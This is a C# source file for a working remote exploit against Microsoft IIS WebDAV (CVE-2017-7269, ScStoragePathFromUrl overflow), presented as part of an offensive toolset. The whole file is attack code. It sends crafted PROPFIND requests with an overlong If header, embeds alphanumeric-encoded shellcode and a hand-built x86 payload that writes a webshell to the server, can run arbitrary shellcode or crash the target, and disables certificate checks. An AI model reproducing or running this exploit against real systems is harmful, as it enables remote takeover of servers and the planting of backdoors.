using System;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Web;
using System.Net;
using System.Net.Cache;
using System.Net.Security;
using System.Threading;
using System.Security.Cryptography.X509Certificates;

class Exploit
{
    static Random rnd = new Random();
    static string check_exit_process = "VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPQZKO2JKO36VXLJM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A";
    static string check_exit_thread = "VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397O00WRJKPSSI7KQR72JPXKOXPP3GP0PPP36VXLKM1VZM0LCKNSOKON2KPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJMPNQ03LMLJPXNM1J13OWNMOS2H352CBKOJO0PCQFOUNMOB00NQNWNMP7OBP6OILMKZLMKZ130V15NMP2P0NQP7NMNWOBNV09KPM0A";
    private static bool CheckValidationResult(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors) { return true; }
    static bool stricmp(string s1, string s2) { return string.Equals(s1, s2, StringComparison.OrdinalIgnoreCase); }
    static void Help()
    {
        Console.WriteLine(
@"usage: CVE-2017-7269 <url> [parms]

Header:
-h <host>	set host for [If] header
-p <port>	set port for [If] header
-s <scheme>	set scheme for [If] header
-l <length>	length of physical path

WebShell:
-w <webshell>	upload webshell to server
-wp <shellpath>	path of webshell to save

ShellCode:
-c <shellcode>	execute the shellcode

Misc:
-t	test vulnerable only.
-e	exit process when getshell or test
-k	kill target(equals -e and -t)

eg:
CVE-2017-7269 http://192.168.1.1/
CVE-2017-7269 http://192.168.1.1/ -l 19
CVE-2017-7269 http://host.remote/ -h test.local -p 8080 -s https
CVE-2017-7269 http://192.168.1.1/ -e -l 22 -w evil.asp -wp /webshell.asp
CVE-2017-7269 http://192.168.1.1/ -c shellcode.bin
");
    }
    static void Main(string[] args)
    {
        Console.WriteLine("Exploit for CVE-2017-7269(Microsoft IIS WebDav ScStoragePathFromUrl Overflow).");
        Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
        string shellname = "";
        string shellfile = "";
        byte[] shelldata = null;

        string shellcodefile = "";
        byte[] shellcodedata = null;

        byte pathlen = 0;
        string IfHeader = "";
        Uri u = null;
        string scheme = "";
        string host = "";
        int port = 0;

        bool isexit = false;
        bool testmode = false;

        ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);
        string alpha = "";
        Exception ex;
        HttpWebResponse response = null;
        if (args.Length < 1)
        {
            Help();
            return;
        }
        try
        {
            u = new Uri(args[0]);
            for (int i = 1; i < args.Length; i++)
            {
                if (stricmp(args[i], "-h")) { i++; host = args[i]; }
                else if (stricmp(args[i], "-p")) { i++; port = int.Parse(args[i]); }
                else if (stricmp(args[i], "-s")) { i++; scheme = args[i]; }
                else if (stricmp(args[i], "-l")) { i++; pathlen = byte.Parse(args[i]); }
                else if (stricmp(args[i], "-w")) { i++; shellfile = args[i]; }
                else if (stricmp(args[i], "-wp")) { i++; shellname = args[i]; }
                else if (stricmp(args[i], "-c")) { i++; shellcodefile = args[i]; }
                else if (stricmp(args[i], "-t")) { testmode = true; }
                else if (stricmp(args[i], "-e")) { isexit = true; }
                else if (stricmp(args[i], "-k")) { testmode = true; isexit = true; }
                else { Help(); return; }
            }
        }
        catch { Console.WriteLine("[x] invalidate parms, try [-help]"); return; }

        try
        {
            if (shellcodefile != "")
            {
                shellcodedata = File.ReadAllBytes(shellcodefile);
                if (shellcodedata.Length == 0) { shellcodedata = null; };
            }
            if (shellfile != "")
            {
                shelldata = File.ReadAllBytes(shellfile);
                if (shellname == "") { throw new Exception("shellpath must be set."); }
                if (shelldata.Length == 0) { shelldata = null; };
            }
            if (shelldata != null && shellcodedata != null) { throw new Exception("webshell, or shellcode?"); }
            if (shelldata == null && shellcodedata == null && !testmode) { throw new Exception("webshell, or shellcode?"); }
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] error on init, message: {0}", e.Message);
            return;
        }
        response = GetResponse(u, "GET", null, out ex);
        if (response == null)
        {
            Console.WriteLine("[x] can not connect to {0},error:\n {1}", ex);
            return;
        }
        if (scheme == "")
        {
            scheme = u.Scheme;
        }
        if (host == "")
        {
            host = u.Host;
        }
        if (port == 0)
        {
            port = u.Port;
        }

        if (pathlen == 0)
        {
            Console.WriteLine("[+] check length of target path...");
            alpha = check_exit_thread;
            byte b = 0;
            for (b = 0; b < 114; b++)
            {
                IfHeader = GetIfHeader(scheme, host, port, b, alpha);
                response = GetResponse(u, "PROPFIND", IfHeader, out ex);
                if (response != null)
                {
                    if ((int)response.StatusCode == 200)
                    {
                        if (response.Headers["X-ZCG-Check"] == "CVE-2017-7269")
                        {
                            pathlen = b;
                        }
                        else
                        {
                            Console.WriteLine("[?] server returns 200 but no header returned.");
                        }
                        break;
                    }
                    else if ((int)response.StatusCode == 500)
                    {
                        Thread.Sleep(100);
                        continue;
                    }
                    else
                    {
                        Console.WriteLine("[?] server returns bad status: {0} {1}.", (int)response.StatusCode, response.StatusDescription);
                        Console.WriteLine("[?] invulnerable or dead?");
                        DumpResponse(response);
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("[-] response error on length: {0},message: {1}", b, ex.Message);
                }
            }
            if (b == 114)
            {
                Console.WriteLine("[x] can not get length of target path!");
                if (response != null)
                {
                    Console.WriteLine("[?] last status code: {0}.", response.StatusCode);
                    Console.WriteLine("[?] invulnerable or dead?");
                    DumpResponse(response);
                }
                return;
            }
        }
        if (pathlen == 0)
        {
            Console.WriteLine("[x] can not get length of target path!");
            if (response != null)
            {
                DumpResponse(response);
            }
            return;
        }
        if (isexit)
        {
            alpha = check_exit_process;
        }
        else
        {
            alpha = check_exit_thread;
        }
        IfHeader = GetIfHeader(scheme, host, port, pathlen, alpha);
        response = GetResponse(u, "PROPFIND", IfHeader, out ex);
        if (response != null)
        {
            if ((int)response.StatusCode == 200)
            {
                if (response.Headers["X-ZCG-Check"] == "CVE-2017-7269")
                {
                    Console.WriteLine("[+] length of target path is: " + pathlen);
                }
                else
                {
                    Console.WriteLine("[?] server returns 200 but no header returned.");
                }
            }
            else if ((int)response.StatusCode == 500)
            {
                Console.WriteLine("[x] server returns 500 ,length of target path maybe wrong.");
            }
            else
            {
                Console.WriteLine("[?] server returns bad status: {0} {1}.", (int)response.StatusCode, response.StatusDescription);
                Console.WriteLine("[?] invulnerable or dead?");
                DumpResponse(response);
                return;
            }
        }
        else
        {
            Console.WriteLine("[x] error on get shell response, message: {0}", ex.Message);
        }
        if (testmode)
        {
            Console.WriteLine("[+] check complete.");
            return;
        }
        if (shellcodedata == null)
        {
            Console.WriteLine("[+] upload webshell to server....");
            alpha = AlphaEncodeWithUnicodeUpperCaseESI(BulidShellCode(shellname, shelldata, pathlen, isexit));
            IfHeader = GetIfHeader(scheme, host, port, pathlen, alpha);
            response = GetResponse(u, "PROPFIND", IfHeader, out ex);
            if (response != null)
            {
                if ((int)response.StatusCode == 200)
                {
                    if (response.Headers["X-ZCG-Shell-Status"] == "1")
                    {
                        Console.WriteLine("[!] webshell was successfully write to [{0}].", shellname);
                    }
                    else if (response.Headers["X-ZCG-Shell-Status"] == "0")
                    {
                        Console.WriteLine("[x] path: [{0}] was not writable.", shellname);
                    }
                    else
                    {
                        Console.WriteLine("[?] server returns 200 but no header returned.");
                    }
                }
                else if ((int)response.StatusCode == 500)
                {
                    Console.WriteLine("[x] server returns 500 ,length of target path maybe wrong.");
                }
                else
                {
                    Console.WriteLine("[?] server returns unknown status: {0} {1}.", (int)response.StatusCode, response.StatusDescription);
                    DumpResponse(response);
                }
            }
            else
            {
                Console.WriteLine("[x] error on get shell response, message: {0}", ex.Message);
            }
        }
        else
        {
            Console.WriteLine("[+] run shellcode on server....");
            alpha = AlphaEncodeWithUnicodeUpperCaseESI(shellcodedata);
            IfHeader = GetIfHeader(scheme, host, port, pathlen, alpha);
            response = GetResponse(u, "PROPFIND", IfHeader, out ex);
            if (response != null)
            {
                Console.WriteLine("[+] shellcode was send to server, check response manually....");
                DumpResponse(response);
            }
            else
            {
                Console.WriteLine("[?] shellcode response returns error message: {0}", ex.Message);
                Console.WriteLine("[?] check response manually....");
            }
        }




    }
    static void DumpResponse(HttpWebResponse response)
    {
        if (response != null)
        {
            Console.WriteLine("[+] raw response:");
            Console.WriteLine("HTTP/{0} {1} {2}", response.ProtocolVersion, (int)response.StatusCode, response.StatusDescription);
            foreach (string s in response.Headers.AllKeys)
            {
                Console.WriteLine(s + " : " + response.Headers[s]);
            }
            Console.WriteLine();
            Console.WriteLine(new StreamReader(response.GetResponseStream()).ReadToEnd());
        }
    }
    static string GetIfHeader(string scheme, string host, int port, byte pathlen, string shellcode)
    {
        return string.Format("<{0}://{1}:{2}/{3}{6}> (Not <locktoken:write1>) <{0}://{1}:{2}/{4}{7}{5}>", scheme, host, port, GetPadding(pathlen), GetPadding(pathlen), shellcode, HttpUtility.UrlEncode("橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬"), HttpUtility.UrlEncode("婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁"));
    }
    static HttpWebResponse GetResponse(Uri u, string method, string IfHeader, out Exception exception)
    {
        HttpWebResponse response = null;
        HttpWebRequest request = null;
        exception = null;
        try
        {
            request = (HttpWebRequest)WebRequest.Create(u);
            if (IfHeader != null) { request.Headers.Add("If", IfHeader); }
            request.ContentLength = 0;
            request.KeepAlive = false;
            request.Method = method;
            request.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
            request.ServicePoint.ConnectionLimit = 0xffffff;
            response = request.GetResponse() as HttpWebResponse;
        }
        catch (WebException ex)
        {
            response = ex.Response as HttpWebResponse;
            if (response == null)
            {
                request.Abort();
                exception = ex;
            }
            return response;
        }
        catch (Exception ex)
        {
            request.Abort();
            exception = ex;
            if (response != null)
            {
                response.Close();
            }
            return null;
        }
        finally
        {
            request = null;
        }
        return response;
    }
    static string GetPadding(byte pathlen)
    {
        string padding = "";
        string table = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        for (int i = pathlen; i < 114; i++)
        {
            padding += table[rnd.Next(0, 62)];
        }
        return padding;
    }
    static byte[] BulidShellCode(string shellname, byte[] shelldata, byte pathlen, bool isexit)
    {
        int shellnamelen = shellname.Length + 1;
        int shellnamelenuni = shellnamelen * 2;
        int pathlenuni = pathlen * 2;
        int filenamesub = shellnamelenuni + pathlenuni;
        int shelldataoff = 0x16f + shellnamelenuni;
        List<byte> shellcode = new List<byte>();
        shellcode.AddRange(new byte[] {
	0x64, 0x8B, 0x35, 0x18, 0x00, 0x00, 0x00, 0x8B, 0x7E, 0x04, 0x57, 0x8B, 0x46, 0x30, 0x8B, 0x40, 
	0x0C, 0x8B, 0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x40, 0x08, 0x8B, 0xD8, 0x53, 0x8B, 0xF8, 0x8B, 0x47, 
	0x3C, 0x8B, 0x54, 0x07, 0x78, 0x03, 0xD7, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x03, 0xDF, 0x49, 
	0x8B, 0x34, 0x8B, 0x03, 0xF7, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x39, 0x06, 0x75, 0xF1, 0xB8, 0x72, 
	0x6F, 0x63, 0x41, 0x39, 0x46, 0x04, 0x75, 0xE7, 0x8B, 0x5A, 0x24, 0x03, 0xDF, 0x66, 0x8B, 0x0C, 
	0x4B, 0x8B, 0x5A, 0x1C, 0x03, 0xDF, 0x8B, 0x04, 0x8B, 0x03, 0xC7, 0x5B, 0x5F, 0x89, 0x47, 0xFC, 
	0xE8, 0x00, 0x00, 0x00, 0x00
});
        shellcode.Add(0x90);//nop or int3
        shellcode.AddRange(new byte[]{
	0x5E, 0x8B, 0xCE, 0x81, 0xC1, 0xE9, 0x00, 0x00, 0x00, 0x51, 0x53, 0xFF, 0xD0, 0x8B, 0xCE, 0x81, 
	0xC1, 0xF6, 0x00, 0x00, 0x00, 0x51, 0xFF, 0xD0, 0x8B, 0xD8, 0x8B, 0xCE, 0x81, 0xC1, 0x01, 0x01, 
	0x00, 0x00, 0x51, 0x53, 0x8B, 0x47, 0xFC, 0xFF, 0xD0, 0x57, 0x56, 0x81, 0xC6, 0x09, 0x01, 0x00, 
	0x00, 0x56, 0x83, 0xC6, 0x66, 0x81, 0xEF, 0x4C, 0x05, 0x00, 0x00
});
        if (pathlenuni > 0x7f)
        {
            shellcode.Add(0x83);
            shellcode.Add(0xc7);
            shellcode.AddRange(BitConverter.GetBytes(pathlenuni));
        }
        else
        {
            shellcode.Add(0x83);
            shellcode.Add(0xc7);
            shellcode.Add((byte)pathlenuni);
            shellcode.Add(0x90);
            shellcode.Add(0x90);
            shellcode.Add(0x90);
        }
        shellcode.Add(0xb9);
        shellcode.AddRange(BitConverter.GetBytes(shellnamelenuni));
        shellcode.AddRange(new byte[] { 0xfc, 0xf3, 0xa4 });
        if (filenamesub > 0x7f)
        {
            shellcode.Add(0x81);
            shellcode.Add(0xef);
            shellcode.AddRange(BitConverter.GetBytes(pathlenuni));
        }
        else
        {
            shellcode.Add(0x83);
            shellcode.Add(0xef);
            shellcode.Add((byte)filenamesub);
            shellcode.Add(0x90);
            shellcode.Add(0x90);
            shellcode.Add(0x90);
        }
        shellcode.AddRange(new byte[]{
	0x57, 0xFF, 0xD0, 0x83, 0xC4, 0x08, 0x5E, 0x5F, 0x85, 0xC0, 0x74, 0x3A, 0x89, 0x47, 0xF8, 0x50, 
	0x8B, 0xCE, 0x81, 0xC1, 0x0D, 0x01, 0x00, 0x00, 0x51, 0x53, 0x8B, 0x47, 0xFC, 0xFF, 0xD0, 0x8B, 
	0xCE
});
        shellcode.Add(0x81);
        shellcode.Add(0xc1);
        shellcode.AddRange(BitConverter.GetBytes(shelldataoff));
        shellcode.AddRange(new byte[]{
	0x51, 0xFF, 0xD0, 0x83, 0xC4, 0x08, 0x8B, 0xCE, 0x81, 0xC1, 0x13, 0x01, 0x00, 0x00, 0x51, 0x53, 
	0x8B, 0x47, 0xFC, 0xFF, 0xD0, 0x8B, 0x4F, 0xF8, 0x51, 0xFF, 0xD0, 0xB0, 0x31, 0xEB, 0x02, 0xB0, 
	0x30, 0x8B, 0xCE, 0x81, 0xC1, 0x5C, 0x01, 0x00, 0x00, 0x88, 0x01, 0x81, 0xEF, 0x40, 0x03, 0x00, 
	0x00, 0x8B, 0x0F, 0x8B, 0x01, 0x8B, 0x80, 0xA0, 0x00, 0x00, 0x00, 0x51, 0x68, 0xC8, 0x00, 0x00, 
	0x00, 0x81, 0xC6, 0x1A, 0x01, 0x00, 0x00, 0x56, 0x6A, 0x00, 0x83, 0xC6, 0x01, 0x56, 0x6A, 0x54, 
	0xFF, 0xD0
});
        if (isexit)
        {
            shellcode.AddRange(new byte[] { 0x6a, 0xff, 0x6a, 0xff, 0x66, 0xb8, 0x0a, 0x01 });
            shellcode.AddRange(new byte[] { 0xBA, 0x00, 0x03, 0xFE, 0x7F, 0xFF, 0x12 });
        }
        else
        {
            shellcode.AddRange(new byte[] { 0x33, 0xc0, 0x50, 0x50, 0x66, 0xb8, 0x0b, 0x01 });
            shellcode.AddRange(new byte[] { 0xBA, 0x00, 0x03, 0xFE, 0x7F, 0xFF, 0x12 });
        }
        shellcode.AddRange(new byte[] { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 });
        shellcode.AddRange(new byte[]{
        0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x6D, 0x73, 0x76, 
        0x63, 0x72, 0x74, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x5F, 0x77, 0x66, 0x6F, 0x70, 0x65, 0x6E, 0x00, 
        0x77, 0x00, 0x00, 0x00, 0x66, 0x70, 0x75, 0x74, 0x73, 0x00, 0x66, 0x63, 0x6C, 0x6F, 0x73, 0x65, 
        0x00, 0x00, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x6E, 0x74, 0x2D, 0x54, 0x79, 0x70, 0x65, 0x3A, 0x20, 
        0x74, 0x65, 0x78, 0x74, 0x2F, 0x68, 0x74, 0x6D, 0x6C, 0x0D, 0x0A, 0x43, 0x6F, 0x6E, 0x74, 0x65, 
        0x6E, 0x74, 0x2D, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x3A, 0x20, 0x31, 0x33, 0x0D, 0x0A, 0x58, 
        0x2D, 0x5A, 0x43, 0x47, 0x2D, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2D, 0x53, 0x74, 0x61, 0x74, 0x75, 
        0x73, 0x3A, 0x20, 0x3F, 0x0D, 0x0A, 0x0D, 0x0A, 0x43, 0x56, 0x45, 0x2D, 0x32, 0x30, 0x31, 0x37, 
        0x2D, 0x37, 0x32, 0x36, 0x39, 0x00
    });
        shellcode.AddRange(Encoding.Unicode.GetBytes(shellname));
        shellcode.Add(0);
        shellcode.Add(0);
        shellcode.AddRange(shelldata);
        shellcode.Add(0);
        return shellcode.ToArray();
    }

    static string AlphaEncodeWithUnicodeUpperCaseESI(byte[] shellcode)
    {
        string header = "VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB";
        string valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder alpha = new StringBuilder(header);
        for (int j = 0; j < shellcode.Length; j++)
        {
            byte input = shellcode[j];
            uint A = (uint)((input & 0xf0) >> 4);
            uint F = (uint)((input & 0x0f));
            uint i = (uint)(rnd.Next() % valid_chars.Length);
            while ((valid_chars[(int)i] & 0x0f) != F) { i = (uint)(++i % valid_chars.Length); }
            uint E = (uint)(valid_chars[(int)i] >> 4);
            uint D = (uint)((A - E) & 0x0f);
            i = (uint)(rnd.Next() % valid_chars.Length);
            while ((valid_chars[(int)i] & 0x0f) != D) { i = (uint)(++i % valid_chars.Length); }
            uint C = (uint)(valid_chars[(int)i] >> 4);
            alpha.Append((char)(byte)((C << 4) + D));
            alpha.Append((char)(byte)((E << 4) + F));
        }
        alpha.Append('A');
        return alpha.ToString();
    }
}